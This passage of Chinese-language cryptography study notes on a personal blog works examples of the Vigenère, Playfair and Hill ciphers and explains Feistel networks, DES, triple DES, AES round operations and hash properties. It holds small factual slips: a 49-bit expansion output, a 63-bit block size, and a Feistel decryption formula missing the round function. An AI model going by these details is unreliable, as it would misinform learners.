 \begin{matrix}
   16 \\
   16 \\
   16\\
   16\\
   16\\
   16\\
   16\\
  \end{matrix}
  \right]
  =
   \left[
 \begin{matrix}
   434 \\
   92\\
   225\\
  54\\
   472\\
   225\\
  206\\
  \end{matrix}
  \right]
  =
   \left[
 \begin{matrix}
   18\\
   14\\
   17\\
  2\\
   4\\
   17\\
  24\\
  \end{matrix}
  \right]
 (mod26)
&lt; =&gt;
 \left[
 \begin{matrix}
   s \\
   o\\
   r\\
   c\\
   e\\
   r\\
   y\\
  \end{matrix}
  \right] %]]&gt;&lt;/script&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;求逆元：&lt;strong&gt;扩展欧几里得算法&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;多表代换&quot;&gt;多表代换&lt;/h3&gt;

&lt;h4 id=&quot;维吉尼亚密码&quot;&gt;维吉尼亚密码&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/img/多表代换.png&quot; alt=&quot;多表代换&quot; /&gt;&lt;/p&gt;

&lt;p&gt;例题：&lt;/p&gt;

&lt;p&gt;p=data security , k = best&lt;/p&gt;

&lt;p&gt;先将明文分解为长为4的序列：&lt;/p&gt;

&lt;p&gt;data 			secu 			rity&lt;/p&gt;

&lt;p&gt;每个序列用秘钥best加密&lt;/p&gt;

&lt;p&gt;密文：EELT  	TIUN	  SMLR&lt;/p&gt;

&lt;h4 id=&quot;playfair密码&quot;&gt;Playfair密码&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/img/维吉尼亚密码.png&quot; alt=&quot;维吉尼亚密码&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/playfair2.png&quot; alt=&quot;playfair2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;例题：&lt;/p&gt;

&lt;p&gt;设秘钥为：PLAYFAIR IS A DIGRAM CIPHER&lt;/p&gt;

&lt;p&gt;字母矩阵：
&lt;script type=&quot;math/tex&quot;&gt;% &lt;![CDATA[
\left[
 \begin{matrix}
  P&amp;L &amp;A &amp;Y&amp; F \\
   I/J&amp;R&amp;S&amp;D&amp;G\\
   M&amp;C&amp;H&amp;E&amp;B\\
   K&amp;N&amp;O&amp;Q&amp;T\\
   U&amp;V&amp;W&amp;X&amp;Z\\
  \end{matrix}
  \right] %]]&gt;&lt;/script&gt;&lt;/p&gt;

&lt;p&gt;明文：pI ay fa ir ci ph er&lt;/p&gt;

&lt;p&gt;密文: LA YF PY RS MR AM CD&lt;/p&gt;

&lt;h4 id=&quot;希尔密码&quot;&gt;希尔密码&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/img/希尔密码.png&quot; alt=&quot;希尔密码&quot; /&gt;&lt;/p&gt;

&lt;p&gt;例题：&lt;/p&gt;

&lt;p&gt;明文：cyber，数字化：2,24,1,4,17&lt;/p&gt;

&lt;p&gt;秘钥:
&lt;script type=&quot;math/tex&quot;&gt;% &lt;![CDATA[
\left[
\begin{matrix}
  10&amp;5 &amp;12 &amp;0&amp; 0 \\
   3&amp;14&amp;21&amp;0&amp;0\\
   8&amp;9&amp;11&amp;0&amp;0\\
   0&amp;0&amp;0&amp;11&amp;8\\
   0&amp;0&amp;0&amp;3&amp;7\\
  \end{matrix}
  \right] %]]&gt;&lt;/script&gt;
加密：
&lt;script type=&quot;math/tex&quot;&gt;% &lt;![CDATA[
c=(2,24,1,4,17)
\left[
\begin{matrix}
  10&amp;5 &amp;12 &amp;0&amp; 0 \\
   3&amp;14&amp;21&amp;0&amp;0\\
   8&amp;9&amp;11&amp;0&amp;0\\
   0&amp;0&amp;0&amp;11&amp;8\\
   0&amp;0&amp;0&amp;3&amp;7\\
  \end{matrix}
  \right]
  =
  \left[
\begin{matrix}
  100 \\
   355\\
   539\\
   95\\
   151\\
  \end{matrix}
  \right]^{T}
  (mod26)=
  \left[
\begin{matrix}
  22 \\
   17\\
   19\\
   17\\
   21\\
  \end{matrix}
  \right]^{T}
  &lt;=&gt;
  \left[
  \begin{matrix}
  W\\
  R\\
  T\\
  R\\
  V
  \end{matrix}
  \right] %]]&gt;&lt;/script&gt;
解密秘钥：
&lt;script type=&quot;math/tex&quot;&gt;% &lt;![CDATA[
K^{-1}=
\left[
\begin{matrix}
21&amp;15&amp;17&amp;0&amp;0\\
21&amp;2&amp;16&amp;0&amp;0\\
25&amp;4&amp;3&amp;0&amp;0\\
0&amp;0&amp;0&amp;7&amp;18\\
0&amp;0&amp;0&amp;23&amp;11
\end{matrix}
\right] %]]&gt;&lt;/script&gt;
解密：
&lt;script type=&quot;math/tex&quot;&gt;% &lt;![CDATA[
p=(22,17,19,17,21)
\left [
\begin{matrix}
21&amp;15&amp;17&amp;0&amp;0\\
21&amp;2&amp;16&amp;0&amp;0\\
25&amp;4&amp;3&amp;0&amp;0\\
0&amp;0&amp;0&amp;7&amp;18\\
0&amp;0&amp;0&amp;23&amp;11
\end{matrix}
\right ]
=
\left [
\begin{matrix}
1328\\
440\\
703\\
602\\
537
\end{matrix}
\right ]^{T}
(mod 26)
=
\left[
\begin{matrix}
2\\
24\\
1\\
4\\
17
\end{matrix}
\right ]
&lt;=&gt;
\left[
\begin{matrix}
c\\y\\
b\\
e\\
r
\end{matrix}
\right]^{T} %]]&gt;&lt;/script&gt;&lt;/p&gt;

&lt;h1 id=&quot;分组密码&quot;&gt;分组密码&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;分组密码（block cipher）是现代密码学中的重要体制之一，也是应用最广泛、影响最大的一种密码体制。其主要任务是提供数据保密性，也可以用在伪随机数生成器、序列密码、认证码和哈希函数的构造&lt;/p&gt;

  &lt;p&gt;分组密码又称为对称密码，具有加解密速度快、安全性好的特点。得到许多密码芯片的支持，在许多研究和应用领域中得到了广泛的应用&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/img/分组密码流程.png&quot; alt=&quot;分组密码流程&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;扩散混乱&quot;&gt;扩散＆混乱&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;扩散：打乱明文，每一位比特明文的变化尽可能影响输出的密文序列比特，使得明文和密文之间的统计关系尽量复杂，即从密文不能获得明文的统计特性&lt;/li&gt;
  &lt;li&gt;混乱：打乱明文，加密过程中，明文，密文，秘钥间的关系尽可能复制，使从密文中不能获得密钥的任何统计特性&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;feiste网络&quot;&gt;Feiste网络&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;用简单算法的乘积来近似表达复杂的替代变换&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;优点：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;加解密相似，只需要一个逆转的密钥编排算法，加解密算法部分完全一致&lt;/li&gt;
  &lt;li&gt;轮函数不必可逆&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;原理&quot;&gt;原理&lt;/h3&gt;

&lt;p&gt;F表示轮函数,Ki表示每一轮的子秘钥&lt;/p&gt;

&lt;h4 id=&quot;加密&quot;&gt;加密&lt;/h4&gt;

&lt;blockquote&gt;
  &lt;p&gt;i表示轮数&lt;/p&gt;
&lt;/blockquote&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;将明文分割为左右两部分(L_{0},R_{0})\\
L_{i+1} = R_{i}\\
R_{i+1} = L_{i}\bigoplus F(R_{i},k_{i})\\&lt;/script&gt;

&lt;h4 id=&quot;解密&quot;&gt;解密&lt;/h4&gt;

&lt;blockquote&gt;
  &lt;p&gt;(i=n,n-1,…0)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;R_{i}  = L_{i+1}\\
l_{i} = R_{i+1}\bigoplus(L_{i+1},k_{i})\\
(L_{0},R_{0})为解密后的明文&lt;/script&gt;

&lt;h2 id=&quot;雪崩效应&quot;&gt;雪崩效应&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/img/雪崩效应.png&quot; alt=&quot;雪崩效应&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;sp网络&quot;&gt;SP网络&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/img/sp网络.png&quot; alt=&quot;sp网络&quot; /&gt;&lt;/p&gt;

&lt;p&gt;SP网络具有雪崩效应&lt;/p&gt;

&lt;h2 id=&quot;子秘钥生成方法&quot;&gt;子秘钥生成方法&lt;/h2&gt;

&lt;p&gt;子秘钥生成是迭代分组算法的一个重要部分，轮函数Ｆ的功能是在子秘钥的参与和控制下实现的&lt;/p&gt;

&lt;p&gt;子秘钥评价指标：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;简单，速度快&lt;/li&gt;
  &lt;li&gt;种子秘钥的所有比特对每个子秘钥比特的影响大致相同&lt;/li&gt;
  &lt;li&gt;没有弱秘钥&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;轮函数ｆ设计准则&quot;&gt;轮函数Ｆ设计准则&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;非线性&lt;/p&gt;

    &lt;blockquote&gt;
      &lt;p&gt;依赖Ｓ盒&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;可逆性&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;雪崩效应&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;des加密&quot;&gt;DES加密&lt;/h1&gt;

&lt;h2 id=&quot;概述&quot;&gt;概述&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;分组加密：明文密文为64位分组长度&lt;/li&gt;
  &lt;li&gt;密码算法：同一个算法&lt;/li&gt;
  &lt;li&gt;密钥长度：56位，存在弱秘钥，但是可以避开&lt;/li&gt;
  &lt;li&gt;采用混乱和扩散组合,每个组先代换后置换，共16轮&lt;/li&gt;
  &lt;li&gt;易于实现,速度快&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;流程&quot;&gt;流程&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/img/des加密.png&quot; alt=&quot;des加密&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;初始置换ip&quot;&gt;初始置换(IP)&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/img/初始置换.png&quot; alt=&quot;初始置换&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;轮变换&quot;&gt;轮变换&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/img/轮变换.png&quot; alt=&quot;轮变换&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;f函数&quot;&gt;F函数&lt;/h2&gt;

&lt;h3 id=&quot;扩展置换&quot;&gt;扩展置换&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;又叫E盒&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;扩展置置换目标是IP置换后获得的右半部分R0，将32位输入扩展为48位(分为4位×8组)输出。&lt;/p&gt;

&lt;p&gt;扩展置换目的有两个：生成与密钥相同长度的数据以进行异或运算；提供更长的结果，在后续的替代运算中可以进行压缩。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/home/admin233/Documents/verylazycat.github.io/img/E盒.png&quot; alt=&quot;E盒&quot; /&gt;&lt;/p&gt;

&lt;p&gt;表中的数字代表位，两列黄色数据是扩展的数据，可以看出，扩展的数据是从相邻两组分别取靠近的一位，4位变为6位。靠近32位的位为1，靠近1位的位为32。表中第二行的4取自上组中的末位，9取自下组中的首位。&lt;/p&gt;

&lt;h3 id=&quot;秘钥加&quot;&gt;秘钥加&lt;/h3&gt;

&lt;p&gt;E扩展输出的49位与48位子秘钥逐位异或,输出48位数据&lt;/p&gt;

&lt;h3 id=&quot;代换盒&quot;&gt;代换盒&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;S盒&lt;/p&gt;

  &lt;p&gt;目的:非线性变换&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;压缩后的密钥与扩展分组异或以后得到48位的数据，将这个数据送人S盒，进行替代运算。替代由8个不同的S盒完成，每个S盒有6位输入4位输出。48位输入分为8个6位的分组，一个分组对应一个S盒，对应的S盒对各组进行代替操作。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/home/admin233/Documents/verylazycat.github.io/img/S盒.png&quot; alt=&quot;S盒&quot; /&gt;&lt;/p&gt;

&lt;p&gt;　一个S盒就是一个4行16列的表，盒中的每一项都是一个4位的数。S盒的6个输入确定了其对应的输出在哪一行哪一列，输入的高低两位做为行数H，中间四位做为列数L，在S-BOX中查找第H行L列对应的数据(&amp;lt;32)&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;S盒代替时DES算法的关键步骤，所有的其他的运算都是线性的，易于分析，而S盒是非线性的，相比于其他步骤，提供了更好安全性。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;p盒置换&quot;&gt;P盒置换&lt;/h3&gt;

&lt;p&gt;S盒代替运算的32位输出按照P盒进行置换。该置换把输入的每位映射到输出位，任何一位不能被映射两次，也不能被略去,映射规则如下表:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;16&lt;/th&gt;
      &lt;th&gt;7&lt;/th&gt;
      &lt;th&gt;20&lt;/th&gt;
      &lt;th&gt;21&lt;/th&gt;
      &lt;th&gt;29&lt;/th&gt;
      &lt;th&gt;12&lt;/th&gt;
      &lt;th&gt;28&lt;/th&gt;
      &lt;th&gt;17&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;1&lt;/td&gt;
      &lt;td&gt;15&lt;/td&gt;
      &lt;td&gt;23&lt;/td&gt;
      &lt;td&gt;26&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;18&lt;/td&gt;
      &lt;td&gt;31&lt;/td&gt;
      &lt;td&gt;10&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;8&lt;/td&gt;
      &lt;td&gt;24&lt;/td&gt;
      &lt;td&gt;14&lt;/td&gt;
      &lt;td&gt;32&lt;/td&gt;
      &lt;td&gt;27&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;9&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;19&lt;/td&gt;
      &lt;td&gt;13&lt;/td&gt;
      &lt;td&gt;30&lt;/td&gt;
      &lt;td&gt;6&lt;/td&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;11&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;25&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;表中的数字代表原数据中此位置的数据在新数据中的位置，即原数据块的第16位放到新数据的第1位，第7位放到第2位，……依此类推，第25位放到第32位。&lt;/p&gt;

&lt;p&gt;例如0x10A1 0001进行P盒置换后变为0x8000 0886。&lt;/p&gt;

&lt;p&gt;最后，P盒置换的结果与最初的64位分组左半部分L0异或，然后左、右半部分交换，接着开始另一轮。&lt;/p&gt;

&lt;h2 id=&quot;ip-1末置换&quot;&gt;IP-1末置换&lt;/h2&gt;

&lt;p&gt;末置换是初始置换的逆过程，DES最后一轮后，左、右两半部分并未进行交换，而是两部分合并形成一个分组做为末置换的输入。末置换规则如下表：&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;40&lt;/th&gt;
      &lt;th&gt;8&lt;/th&gt;
      &lt;th&gt;48&lt;/th&gt;
      &lt;th&gt;16&lt;/th&gt;
      &lt;th&gt;56&lt;/th&gt;
      &lt;th&gt;24&lt;/th&gt;
      &lt;th&gt;64&lt;/th&gt;
      &lt;th&gt;32&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;39&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;47&lt;/td&gt;
      &lt;td&gt;15&lt;/td&gt;
      &lt;td&gt;55&lt;/td&gt;
      &lt;td&gt;23&lt;/td&gt;
      &lt;td&gt;63&lt;/td&gt;
      &lt;td&gt;31&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;38&lt;/td&gt;
      &lt;td&gt;6&lt;/td&gt;
      &lt;td&gt;46&lt;/td&gt;
      &lt;td&gt;14&lt;/td&gt;
      &lt;td&gt;54&lt;/td&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;62&lt;/td&gt;
      &lt;td&gt;30&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;37&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;45&lt;/td&gt;
      &lt;td&gt;13&lt;/td&gt;
      &lt;td&gt;53&lt;/td&gt;
      &lt;td&gt;21&lt;/td&gt;
      &lt;td&gt;61&lt;/td&gt;
      &lt;td&gt;29&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;36&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;44&lt;/td&gt;
      &lt;td&gt;12&lt;/td&gt;
      &lt;td&gt;52&lt;/td&gt;
      &lt;td&gt;20&lt;/td&gt;
      &lt;td&gt;60&lt;/td&gt;
      &lt;td&gt;28&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;35&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;43&lt;/td&gt;
      &lt;td&gt;11&lt;/td&gt;
      &lt;td&gt;51&lt;/td&gt;
      &lt;td&gt;19&lt;/td&gt;
      &lt;td&gt;59&lt;/td&gt;
      &lt;td&gt;27&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;34&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;42&lt;/td&gt;
      &lt;td&gt;10&lt;/td&gt;
      &lt;td&gt;50&lt;/td&gt;
      &lt;td&gt;18&lt;/td&gt;
      &lt;td&gt;58&lt;/td&gt;
      &lt;td&gt;26&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;33&lt;/td&gt;
      &lt;td&gt;1&lt;/td&gt;
      &lt;td&gt;41&lt;/td&gt;
      &lt;td&gt;9&lt;/td&gt;
      &lt;td&gt;49&lt;/td&gt;
      &lt;td&gt;17&lt;/td&gt;
      &lt;td&gt;57&lt;/td&gt;
      &lt;td&gt;25&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;置换方法同上，此处省略。&lt;/p&gt;

&lt;h2 id=&quot;des安全性&quot;&gt;DES安全性&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;互补性&lt;/li&gt;
  &lt;li&gt;弱秘钥&lt;/li&gt;
  &lt;li&gt;迭代轮数&lt;/li&gt;
  &lt;li&gt;秘钥长度&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;3重des&quot;&gt;3重DES&lt;/h2&gt;

&lt;p&gt;优点:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;秘钥长度增加到112位或168为,有效克服穷举&lt;/li&gt;
  &lt;li&gt;相对于DES,增强了抗差分分析和线性分析&lt;/li&gt;
  &lt;li&gt;DES升级到3重DES成本低&lt;/li&gt;
  &lt;li&gt;对密码分析攻击由很强的免疫力&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;不足:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;处理速度慢&lt;/li&gt;
  &lt;li&gt;秘钥长度增加了,但是明文分组的长度没有变化,任为63位,就效率和安全性与秘钥的增长不匹配&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;des分析方法&quot;&gt;DES分析方法&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;穷举&lt;/li&gt;
  &lt;li&gt;差分分析&lt;/li&gt;
  &lt;li&gt;线性分析&lt;/li&gt;
  &lt;li&gt;积分攻击&lt;/li&gt;
  &lt;li&gt;中间相遇攻击&lt;/li&gt;
  &lt;li&gt;相关秘钥攻击&lt;/li&gt;
  &lt;li&gt;侧信道攻击&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;aes&quot;&gt;AES&lt;/h1&gt;

&lt;h2 id=&quot;aes的基本结构&quot;&gt;AES的基本结构&lt;/h2&gt;

&lt;p&gt;AES为分组密码，分组密码也就是把明文分成一组一组的，每组长度相等，每次加密一组数据，直到加密完整个明文。在AES标准规范中，分组长度只能是128位，也就是说，每个分组为16个字节（每个字节8位）。密钥的长度可以使用128位、192位或256位。密钥的长度不同，推荐加密轮数也不同，如下表所示：&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;AES&lt;/th&gt;
      &lt;th&gt;密钥长度（32位比特字)&lt;/th&gt;
      &lt;th&gt;分组长度(32位比特字)&lt;/th&gt;
      &lt;th&gt;加密轮数&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;AES-128&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;10&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;AES-192&lt;/td&gt;
      &lt;td&gt;6&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;12&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;AES-256&lt;/td&gt;
      &lt;td&gt;8&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;14&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;轮数在下面介绍，这里实现的是AES-128，也就是密钥的长度为128位，加密轮数为10轮。
AES的加密公式为C = E(K,P)，在加密函数E中，会执行一个轮函数，并且执行10次这个轮函数，这个轮函数的前9次执行的操作是一样的，只有第10次有所不同。也就是说，一个明文分组会被加密10轮。AES的核心就是实现一轮中的所有操作。&lt;/p&gt;

&lt;p&gt;AES的处理单位是字节，128位的输入明文分组P和输入密钥K都被分成16个字节，分别记为P = P0 P1 … P15 和 K = K0 K1 … K15。如，明文分组为P = abcdefghijklmnop,其中的字符a对应P0，p对应P15。一般地，明文分组用字节为单位的正方形矩阵描述，称为状态矩阵。在算法的每一轮中，状态矩阵的内容不断发生变化，最后的结果作为密文输出。该矩阵中字节的排列顺序为从上到下、从左至右依次排列，如下图所示：
&lt;img src=&quot;/home/admin233/Documents/verylazycat.github.io/img/AES.png&quot; alt=&quot;AES&quot; /&gt;&lt;/p&gt;

&lt;p&gt;现在假设明文分组P为”abcdefghijklmnop”，则对应上面生成的状态矩阵图如下&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/home/admin233/Documents/verylazycat.github.io/img/AES1.png&quot; alt=&quot;AES1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;上图中，0x61为字符a的十六进制表示。可以看到，明文经过AES加密后，已经面目全非。&lt;/p&gt;

&lt;p&gt;类似地，128位密钥也是用字节为单位的矩阵表示，矩阵的每一列被称为1个32位比特字。通过密钥编排函数该密钥矩阵被扩展成一个44个字组成的序列W[0],W[1], … ,W[43],该序列的前4个元素W[0],W[1],W[2],W[3]是原始密钥，用于加密运算中的初始密钥加（下面介绍）;后面40个字分为10组，每组4个字（128比特）分别用于10轮加密运算中的轮密钥加，如下图所示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/home/admin233/Documents/verylazycat.github.io/img/AES2.jpeg&quot; alt=&quot;AES2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;上图中，设K = “abcdefghijklmnop”，则K0 = a, K15 = p, W[0] = K0 K1 K2 K3 = “abcd”。&lt;/p&gt;

&lt;p&gt;AES的整体结构如下图所示，其中的W[0,3]是指W[0]、W[1]、W[2]和W[3]串联组成的128位密钥。加密的第1轮到第9轮的轮函数一样，包括4个操作：字节代换、行位移、列混合和轮密钥加。最后一轮迭代不执行列混合。另外，在第一轮迭代之前，先将明文和原始密钥进行一次异或加密操作。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/home/admin233/Documents/verylazycat.github.io/img/AES.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;上图也展示了AES解密过程，解密过程仍为10轮，每一轮的操作是加密操作的逆操作。由于AES的4个轮操作都是可逆的，因此，解密操作的一轮就是顺序执行逆行移位、逆字节代换、轮密钥加和逆列混合。同加密操作类似，最后一轮不执行逆列混合，在第1轮解密之前，要执行1次密钥加操作。&lt;/p&gt;

&lt;h2 id=&quot;字节代换&quot;&gt;字节代换&lt;/h2&gt;

&lt;p&gt;AES的字节代换其实就是一个简单的查表操作。AES定义了一个S盒和一个逆S盒&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/home/admin233/Documents/verylazycat.github.io/img/AES_s.png&quot; alt=&quot;AES_s&quot; /&gt;&lt;/p&gt;

&lt;p&gt;状态矩阵中的元素按照下面的方式映射为一个新的字节：把该字节的高4位作为行值，低4位作为列值，取出S盒或者逆S盒中对应的行的元素作为输出。例如，加密时，输出的字节S1为0x12,则查S盒的第0x01行和0x02列，得到值0xc9,然后替换S1原有的0x12为0xc9。状态矩阵经字节代换后的图如下：
&lt;img src=&quot;/home/admin233/Documents/verylazycat.github.io/img/字节变换.png&quot; alt=&quot;字节变换&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;字节代换逆操作&quot;&gt;字节代换逆操作&lt;/h2&gt;

&lt;p&gt;逆字节代换也就是查逆S盒来变换,此处不展示&lt;/p&gt;

&lt;h2 id=&quot;行移位&quot;&gt;行移位&lt;/h2&gt;

&lt;p&gt;行移位是一个简单的左循环移位操作。当密钥长度为128比特时，状态矩阵的第0行左移0字节，第1行左移1字节，第2行左移2字节，第3行左移3字节，如下图所示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/home/admin233/Documents/verylazycat.github.io/img/行位移.jpeg&quot; alt=&quot;行位移&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;行移位的逆变换&quot;&gt;行移位的逆变换&lt;/h2&gt;

&lt;p&gt;行移位的逆变换是将状态矩阵中的每一行执行相反的移位操作，例如AES-128中，状态矩阵的第0行右移0字节，第1行右移1字节，第2行右移2字节，第3行右移3字节。&lt;/p&gt;

&lt;h2 id=&quot;列混合&quot;&gt;列混合&lt;/h2&gt;

&lt;p&gt;列混合变换是通过矩阵相乘来实现的，经行移位后的状态矩阵与固定的矩阵相乘，得到混淆后的状态矩阵，如下图的公式所示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/home/admin233/Documents/verylazycat.github.io/img/列混合.png&quot; alt=&quot;列混合&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;列混合逆运算&quot;&gt;列混合逆运算&lt;/h2&gt;

&lt;p&gt;逆向列混合变换可由下图的矩阵乘法定义&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/home/admin233/Documents/verylazycat.github.io/img/列混合逆.png&quot; alt=&quot;列混合逆&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;轮秘钥加&quot;&gt;轮秘钥加&lt;/h2&gt;

&lt;p&gt;轮密钥加是将128位轮密钥Ki同状态矩阵中的数据进行逐位异或操作&lt;/p&gt;

&lt;p&gt;轮密钥加的逆运算同正向的轮密钥加运算完全一致，这是因为异或的逆操作是其自身。轮密钥加非常简单，但却能够影响S数组中的每一位。&lt;/p&gt;

&lt;h2 id=&quot;秘钥扩展&quot;&gt;秘钥扩展&lt;/h2&gt;

&lt;h2 id=&quot;aes解密&quot;&gt;AES解密&lt;/h2&gt;

&lt;h1 id=&quot;hash函数&quot;&gt;Hash函数&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;消息空间到像空间的不可逆映射&lt;/p&gt;

  &lt;p&gt;像通常叫数字指纹,消息摘要,散列值&lt;/p&gt;
&lt;/blockquote&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;h=H(M)&lt;/script&gt;

&lt;h2 id=&quot;性质&quot;&gt;性质&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;H可应用于&lt;code&gt;任意&lt;/code&gt;长度的消息&lt;/li&gt;
  &lt;li&gt;H输出固定长度&lt;/li&gt;
  &lt;li&gt;对于任意给定消息x,计算H(x)比较容易,用硬件和软件均可实现&lt;/li&gt;
  &lt;li&gt;单向性:对于给定散列值h,找到H(x)=h的消息x在计算上不可行&lt;/li&gt;
  &lt;li&gt;抗弱碰撞性:对于给定的消息x,找到满足y!=x且H(x)=H(y)的消息y在计算上不可行&lt;/li&gt;
  &lt;li&gt;抗强碰撞性:找到满足H(x)=H(y)的偶对(x,y)在计算上不可行&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;应用&quot;&gt;应用&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;数字签名&lt;/li&gt;
  &lt;li&gt;生成程序或文档的”数字指纹”&lt;/li&gt;
  &lt;li&gt;用于安全传输和存储口令&lt;/li&gt;
&lt;/ul&gt;

